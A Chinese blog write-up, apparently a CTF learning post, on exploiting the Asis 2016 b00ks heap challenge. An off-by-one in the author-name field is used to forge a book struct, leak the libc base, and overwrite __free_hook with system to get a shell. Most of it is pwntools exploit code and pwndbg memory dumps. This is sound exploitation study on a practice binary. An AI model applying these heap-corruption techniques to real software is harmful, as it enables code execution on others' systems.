<p>​        // 如果程序没有提供“修改模块”，则使用Double Free</p>
<hr>
<p>PS：</p>
<p>基于UAF，可以实现一种被称为<strong>Alloc to Stack</strong>的技术，和上述操作一致，只不过把“目标地址”换做了栈地址</p>
<p>Wiki上把它归为Fastbin Attack，但它的利用核心还是UAF</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/10/free_hook+off-by-one/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/10/free_hook+off-by-one/" class="post-title-link" itemprop="url">free_hook+off-by-one</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-10 15:49:45" itemprop="dateCreated datePublished" datetime="2022-01-10T15:49:45+08:00">2022-01-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-16 15:53:45" itemprop="dateModified" datetime="2022-01-16T15:53:45+08:00">2022-01-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这是我在学习堆利用时的例题，因为libc版本的原因，例题的exp完全不适用于我的系统，并且我看不太懂Wiki上的解析，导致我受挫了很多次</p>
<p>通过不断的试错，我最终搞明白了其中的原理，泄露出了“libc_base”，但是被“libc-2.29.so以及后续版本”中的保护机制给卡了一下，get不了shell</p>
<p>在不断的调试中，我的GDB用得越来越熟练了，算是受益匪浅吧</p>
<hr>
<p><strong>Asis_2016_b00ks</strong></p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641486377981.png" alt="1641486377981"> </p>
<p>循环输入</p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641486431892.png" alt="1641486431892"> </p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641486441363.png" alt="1641486441363"> </p>
<p>64位，dynamically，开了NX，开了PIE，开了Full RELRO</p>
<p><strong>代码分析</strong></p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641486779773.png" alt="1641486779773"> </p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641486812517.png" alt="1641486812517"> </p>
<p>先输入“name”，最多“read”32字节到“off_202018”中，接着就是进入选项了</p>
<p>1.Create a book：</p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641487287596.png" alt="1641487287596"> </p>
<p>输入“书名长度”，“书名”，“描述长度”，“描述”，最后malloc一个list来存储信息</p>
<p>2.Delete a book：</p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641487724350.png" alt="1641487724350">  </p>
<p>把“书名长度”，“书名”，“描述长度”，“描述”都free了，但只置空了list的指针</p>
<p>3.Edit a book：</p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641487974333.png" alt="1641487974333"> </p>
<p>可以修改“描述”</p>
<p>4.Print book detail：</p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641488022437.png" alt="1641488022437"> </p>
<p>打印信息</p>
<p>5.Change current author name：</p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641488067893.png" alt="1641488067893"> </p>
<p>修改“name”</p>
<p><strong>入侵思路</strong></p>
<p>程序可以修改“description”，那么就要围绕“description”来打，首先搭好框架：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">len_book,bookname,len_description,description</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Enter book name size: &#x27;</span>,<span class="built_in">str</span>(len_book))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;(Max 32 chars): &#x27;</span>,bookname)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;description size: &#x27;</span>,<span class="built_in">str</span>(len_description))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;description: &#x27;</span>,description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;delete: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">index,description</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;want to edit: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;book description: &#x27;</span>,description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span>(<span class="params">name</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, name)</span><br></pre></td></tr></table></figure>
<p>程序对于堆溢出有所防范：“description”和“bookname”都是没有堆溢出的</p>
<p><img src="/2022/01/10/free_hook+off-by-one/Users/ywx813/Desktop/HeapAttack/free_hook+off-by-one/wp/1641488067893.png" alt="1641488067893"> </p>
<p>但是“name”的输入却溢出了一字节，这里先看看list中的信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">list</span> )</span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="built_in">list</span> + <span class="number">6</span>) = len;</span><br><span class="line">    *(list_addr + index) = <span class="built_in">list</span>;</span><br><span class="line">    *(<span class="built_in">list</span> + <span class="number">2</span>) = description;</span><br><span class="line">    *(<span class="built_in">list</span> + <span class="number">1</span>) = bookname;</span><br><span class="line">    *<span class="built_in">list</span> = ++id;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id; <span class="comment">//base_addr</span></span><br><span class="line">    <span class="keyword">char</span> *bookname;	<span class="comment">// base_addr+1</span></span><br><span class="line">    <span class="keyword">char</span> *description; <span class="comment">// base_addr+2</span></span><br><span class="line">    <span class="keyword">int</span> size; <span class="comment">// base_addr+6</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先用GDB看看“name”的位置，和“name”附近有什么</p>
<p>在“name”中输入“flag”，然后“search flag”：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -s flag</span><br><span class="line">b00ks           <span class="number">0x555555602040</span> <span class="number">0x67616c66</span> /* <span class="string">&#x27;flag&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7dd938b</span> <span class="number">0x5f5f007367616c66</span> /* <span class="string">&#x27;flags&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7ddbf01</span> <span class="number">0x5f5f007367616c66</span> /* <span class="string">&#x27;flags&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7ddc336</span> <span class="number">0x7563007367616c66</span> /* <span class="string">&#x27;flags&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7f77de0</span> <span class="number">0x6f4e007367616c66</span> /* <span class="string">&#x27;flags&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7f7ec06</span> <span class="string">&#x27;flags &amp; PRINTF_FORTIFY) != 0&#x27;</span></span><br><span class="line">ld-<span class="number">2.31</span>.so      <span class="number">0x7ffff7ff5213</span> <span class="number">0x642f002967616c66</span> /* <span class="string">&#x27;flag)&#x27;</span> */</span><br><span class="line">ld-<span class="number">2.31</span>.so      <span class="number">0x7ffff7ff5d3e</span> <span class="string">&#x27;flag value(s) of 0x%x in DT_FLAGS_1.\n&#x27;</span></span><br><span class="line">ld-<span class="number">2.31</span>.so      <span class="number">0x7ffff7ff6745</span> <span class="string">&#x27;flags &amp; DL_LOOKUP_RETURN_NEWEST)&#x27;</span></span><br></pre></td></tr></table></figure>
<p>再打印这个地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg <span class="number">0x555555602040</span></span><br><span class="line"><span class="number">0x555555602040</span>:	<span class="number">0x0000000067616c66</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602060</span>:	<span class="number">0x00005555556036f0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>只有一个“0x00005555556036f0”，就是“list_addr”（用于存放malloc的list地址）</p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641547875813.png" alt="1641547875813">  </p>
<p>程序故意把“输入字符串”的末尾设置为“\x00”，但“name”的“\x00”溢出到“list_addr”中了，如果这时申请一个“list”，这时它的写入地址就会存入“list_addr”中，从而覆盖掉“\x00”，就可以利用“printf”打印了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0xe0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0xe0</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">list1_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>那么接着干什么呢？还是要围绕“description”来打</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx <span class="number">0x555555602040</span></span><br><span class="line"><span class="number">0x555555602040</span>:	<span class="number">0x0000786b6b687779</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602060</span>:	<span class="number">0x00005555556036f0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>“0x00005555556036f0”为<strong>第一个list</strong>，它的低字节是可以被“name”给覆盖的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx <span class="number">0x555555602040</span></span><br><span class="line"><span class="number">0x555555602040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555602050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555602060</span>:	<span class="number">0x0000555555603600</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>“0x00005555556036f0”变为了“0x0000555555603600”</p>
<p>这样，程序就会以为“0x0000555555603600”是<strong>第一个list</strong></p>
<p>再分析下heap空间：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg <span class="number">0x555555602040</span></span><br><span class="line"><span class="number">0x555555602040</span>:	<span class="number">0x0000786b6b687779</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602060</span>:	<span class="number">0x00005555556036f0</span>	<span class="number">0x0000555555603760</span>  <span class="comment">#list_1 &amp; list_2</span></span><br><span class="line"><span class="number">0x555555602070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5555556036a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x5555556036b0</span>:	<span class="number">0x0000000071717171</span>	<span class="number">0x0000000000000000</span>	<span class="comment">#list_1_bookname</span></span><br><span class="line"><span class="number">0x5555556036c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x5555556036d0</span>:	<span class="number">0x0000000077777777</span>	<span class="number">0x0000000000000000</span>	<span class="comment">#list_1_description</span></span><br><span class="line"><span class="number">0x5555556036e0</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555556036f0</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005555556036b0</span>	<span class="comment">#list_1</span></span><br><span class="line"><span class="number">0x555555603700</span>:	<span class="number">0x00005555556036d0</span>	<span class="number">0x0000000000000004</span></span><br><span class="line"><span class="number">0x555555603710</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x555555603720</span>:	<span class="number">0x0000000065656565</span>	<span class="number">0x0000000000000000</span>  <span class="comment">#list_2_bookname</span></span><br><span class="line"><span class="number">0x555555603730</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x555555603740</span>:	<span class="number">0x0000000072727272</span>	<span class="number">0x0000000000000000</span>	<span class="comment">#list_2_description</span></span><br><span class="line"><span class="number">0x555555603750</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x555555603760</span>:	<span class="number">0x0000000000000002</span>	<span class="number">0x0000555555603720</span>	<span class="comment">#list_2</span></span><br><span class="line"><span class="number">0x555555603770</span>:	<span class="number">0x0000555555603740</span>	<span class="number">0x0000000000000004</span></span><br><span class="line"><span class="number">0x555555603780</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020881</span></span><br></pre></td></tr></table></figure>
<p>如果这样“create list1”，“create list2”，编辑“list_1_description”输入以下数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0xe0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0xe0</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">create(<span class="number">0x21000</span>, <span class="string">&#x27;cccc&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">1</span>) + p64(book2_control_ptr + <span class="number">8</span>) * <span class="number">2</span> + p64(<span class="number">0x1000</span>)</span><br><span class="line">change(<span class="number">1</span>,payload)</span><br></pre></td></tr></table></figure>
<p>那么会生成以下的heap空间：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/60xg <span class="number">0x55c18a470390</span></span><br><span class="line"><span class="number">0x55c18a470390</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000f1</span></span><br><span class="line"><span class="number">0x55c18a4703a0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span>	<span class="comment">#list_1_description</span></span><br><span class="line"><span class="number">0x55c18a4703b0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c18a4703c0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c18a4703d0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c18a4703e0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c18a4703f0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span>	</span><br><span class="line"><span class="number">0x55c18a470400</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x000055c18a4704c8</span>	<span class="comment">#fake_list</span></span><br><span class="line"><span class="number">0x55c18a470410</span>:	<span class="number">0x000055c18a4704c8</span>	<span class="number">0x0000000000001000</span></span><br><span class="line"><span class="number">0x55c18a470420</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span>	</span><br><span class="line"><span class="number">0x55c18a470430</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470440</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470450</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470460</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470470</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470480</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x55c18a470490</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x000055c18a4702b0</span>	<span class="comment">#list_1</span></span><br><span class="line"><span class="number">0x55c18a4704a0</span>:	<span class="number">0x000055c18a4703a0</span>	<span class="number">0x00000000000000e0</span></span><br><span class="line"><span class="number">0x55c18a4704b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x55c18a4704c0</span>:	<span class="number">0x0000000000000002</span>	<span class="number">0x00007fee78052010</span>	<span class="comment">#list_2</span></span><br><span class="line"><span class="number">0x55c18a4704d0</span>:	<span class="number">0x00007fee78030010</span>	<span class="number">0x0000000000021000</span></span><br><span class="line"><span class="number">0x55c18a4704e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001fb21</span></span><br></pre></td></tr></table></figure>
<p>​        // 因为“list2”的“bookname”和“description”很大，所以用mmap函数进行调用</p>
<p>可以发现，如果用“name”把“list_1”尾字节覆盖为“\x00”，程序就会把“fake_list”识别为“list_1”，接着如果用“show”打印，就可以泄露写入的数据</p>
<p>其中“bookname2”会被泄露出来，而“bookname2”是用mmap函数申请的</p>
<p>这里有一个知识：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x563fc9c00000</span>     <span class="number">0x563fc9c02000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      /home/ywhkkx/桌面/b00ks</span><br><span class="line">    <span class="number">0x563fc9e01000</span>     <span class="number">0x563fc9e02000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/ywhkkx/桌面/b00ks</span><br><span class="line">    <span class="number">0x563fc9e02000</span>     <span class="number">0x563fc9e03000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/ywhkkx/桌面/b00ks</span><br><span class="line">    <span class="number">0x563fcb86d000</span>     <span class="number">0x563fcb88e000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7ff6d3dcf000</span>     <span class="number">0x7ff6d3e13000</span> rw-p    <span class="number">44000</span> <span class="number">0</span>      [anon_7ff6d3dcf]</span><br><span class="line">    <span class="number">0x7ff6d3e13000</span>     <span class="number">0x7ff6d3e38000</span> r--p    <span class="number">25000</span> <span class="number">0</span>      /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ff6d3e38000</span>     <span class="number">0x7ff6d3fb0000</span> r-xp   <span class="number">178000</span> <span class="number">25000</span>  /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ff6d3fb0000</span>     <span class="number">0x7ff6d3ffa000</span> r--p    4a000 19d000 /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ff6d3ffa000</span>     <span class="number">0x7ff6d3ffb000</span> ---p     <span class="number">1000</span> <span class="number">1e7000</span> /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line">-------------------------------------------------------------------------</span><br><span class="line">[+] bookname2 &gt;&gt;<span class="number">0x7ff6d3df1010</span></span><br></pre></td></tr></table></figure>
<p>bookname2（0x7ff6d3df1010）：第一次用mmap函数获取的地址</p>
<p>/usr/lib/x86_64-linux-gnu/libc-2.31.so（0x7ff6d3e13000）：libc基址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">4</span>]: <span class="number">0x7ff6d3e13000</span>-<span class="number">0x7ff6d3df1010</span></span><br><span class="line">Out[<span class="number">4</span>]: <span class="number">139248</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: <span class="built_in">hex</span>(<span class="number">139248</span>)</span><br><span class="line">Out[<span class="number">5</span>]: <span class="string">&#x27;0x21ff0&#x27;</span></span><br></pre></td></tr></table></figure>
<p>两者的差值是一个常数（不同的libc文件偏移不同，甚至可能是负数，需要用GDB看）</p>
<p>那么“libc_base”就可以被计算出来，就可以用“free_hook”来get shell了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">libc_base = bookname2 + <span class="number">0x21ff0</span> </span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#one_gadget = libc_base + 0xe6c81</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">success(<span class="string">&#x27;system &gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>, p64(bin_sh) + p64(free_hook))</span><br><span class="line">change(<span class="number">2</span>, p64(system))</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>编辑“list_1_description”，实际上写入了“list_2”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55c18a470400</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x000055c18a4704c8</span>	<span class="comment">#fake_list</span></span><br><span class="line"><span class="number">0x55c18a470410</span>:	<span class="number">0x000055c18a4704c8</span>	<span class="number">0x0000000000001000</span>  <span class="comment">#fake_description(list_2)</span></span><br><span class="line"><span class="number">0x55c18a470420</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span>	</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55c18a4704c0</span>:	<span class="number">0x0000000000000002</span>	addr(<span class="string">&quot;/bin/sh&quot;</span>)		<span class="comment">#list_2</span></span><br><span class="line"><span class="number">0x55c18a4704d0</span>:	addr(free_hook)		<span class="number">0x0000000000021000</span></span><br><span class="line"><span class="number">0x55c18a4704e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001fb21</span></span><br></pre></td></tr></table></figure>
<p>编辑“list_2_description”，在“free_hook”中写入“system”</p>
